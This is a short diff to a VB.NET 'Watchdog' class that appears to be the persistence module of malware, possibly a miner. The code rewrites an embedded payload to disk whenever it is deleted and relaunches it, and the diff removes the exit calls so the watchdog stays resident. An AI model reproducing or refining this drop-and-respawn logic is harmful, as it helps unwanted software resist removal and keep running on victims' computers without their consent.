@@ -47,14 +47,12 @@ Public Class Watchdog
                 If Not System.IO.File.Exists(plp) Then
                     System.IO.File.WriteAllBytes(plp, xm)
                     Process.Start(plp)
-                    Environment.Exit(0)
                 Else
                     If checkcount < 2 Then
                         checkcount += 1
                     Else
                         checkcount = 0
                         Process.Start(plp)
-                        Environment.Exit(0)
                     End If
                 End If
             Else
@@ -62,7 +60,6 @@ Public Class Watchdog
                 If Not System.IO.File.Exists(plp) Then
                     System.IO.File.WriteAllBytes(plp, xm)
                     Process.Start(plp)
-                    Environment.Exit(0)
                 End If
             End If
 
